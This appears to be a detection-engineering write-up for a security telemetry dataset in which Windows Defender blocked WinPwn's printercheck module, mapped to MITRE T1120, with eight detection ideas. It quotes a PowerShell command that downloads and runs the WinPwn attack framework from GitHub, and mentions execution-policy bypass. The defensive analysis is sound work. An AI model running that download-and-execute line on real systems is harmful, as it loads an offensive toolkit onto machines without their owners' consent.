# T1120-2: Peripheral Device Discovery — WinPwn - printercheck

## Technique Context

T1120 Peripheral Device Discovery is a technique where adversaries attempt to gather information about connected peripheral devices like printers, scanners, cameras, or USB devices. This information can help attackers understand the target environment, identify potential attack vectors, or locate sensitive devices that might store data. The technique is commonly used during initial reconnaissance phases and can reveal network-attached devices, locally connected hardware, or removable storage devices that might contain valuable information.

This specific test uses WinPwn's `printercheck` module, which is designed to enumerate printers and related print devices accessible to the system. Attackers often target printers because they frequently store cached documents, have weak security configurations, or provide network access to internal systems.

## What This Dataset Contains

This dataset captures a PowerShell-based peripheral discovery attempt that was blocked by Windows Defender. The primary evidence includes:

**Process Creation Chain (Security 4688 & Sysmon 1):**
- Parent PowerShell process (PID 32500) executing the WinPwn framework download and execution
- Child PowerShell process (PID 29800) with command line: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') printercheck -noninteractive -consoleoutput}`
- Whoami.exe execution (PID 33180) for user discovery

**PowerShell Activity (Events 4103, 4104, 4100):**
- Script block showing the WinPwn download attempt: `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`
- Windows Defender blocking the malicious script with error message: "This script contains malicious content and has been blocked by your antivirus software"
- Set-ExecutionPolicy Bypass commands in multiple PowerShell instances

**Network Activity (Sysmon 22, 3):**
- DNS resolution for `raw.githubusercontent.com` returning GitHub CDN IPs
- Multiple network connections from Windows Defender (MsMpEng.exe) to external IPs, likely for threat intelligence lookups

**Process Access Events (Sysmon 10):**
- PowerShell accessing both whoami.exe and child PowerShell processes with full access (0x1FFFFF)

## What This Dataset Does Not Contain

The dataset lacks the actual peripheral discovery commands because Windows Defender successfully blocked the WinPwn framework from executing. This means there are no:

- Registry queries for printer enumeration (typically in HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print)
- WMI queries for Win32_Printer or related classes
- Network enumeration of print servers or shared printers
- File system access to printer spool directories
- PowerShell cmdlets like Get-Printer or Get-WmiObject queries for printer devices

The Sysmon configuration's include-mode filtering for ProcessCreate events may have also filtered out some legitimate system processes that would normally be involved in printer discovery operations.

## Assessment

This dataset demonstrates excellent detection opportunities for the attempt phase of T1120, even though the actual peripheral discovery was prevented. The combination of process creation logs, PowerShell script block logging, and network monitoring provides comprehensive coverage of the attack vector. Windows Defender's real-time protection proved effective in blocking the malicious framework, but the attempt telemetry is rich enough for threat hunting and detection engineering.

The data quality is high for detecting PowerShell-based tool downloads and execution attempts, though it doesn't showcase the actual peripheral discovery techniques themselves. This is valuable for understanding how modern endpoint protection disrupts attack chains while still generating actionable security telemetry.

## Detection Opportunities Present in This Data

1. **PowerShell script block logging detection** - Monitor for script blocks containing `downloadstring` combined with `githubusercontent.com` and known offensive frameworks like WinPwn

2. **Process command line analysis** - Detect PowerShell processes with command lines containing both web download functions (`new-object net.webclient`) and specific tool names (`printercheck`)

3. **Network behavior correlation** - Alert on DNS queries to `raw.githubusercontent.com` followed by PowerShell processes loading network libraries (urlmon.dll)

4. **Windows Defender block events** - Monitor PowerShell error events (4100) containing "malicious content and has been blocked" to identify attempted tool executions

5. **Process tree anomalies** - Detect PowerShell spawning child PowerShell processes with external download commands

6. **Execution policy bypass detection** - Alert on Set-ExecutionPolicy commands with Bypass parameter, especially in SYSTEM context

7. **Suspicious process access patterns** - Monitor for PowerShell processes accessing child processes with full rights (0x1FFFFF) shortly after creation

8. **GitHub raw content downloads** - Flag attempts to download and execute content directly from GitHub raw URLs, particularly in conjunction with PowerShell invoke-expression (iex)
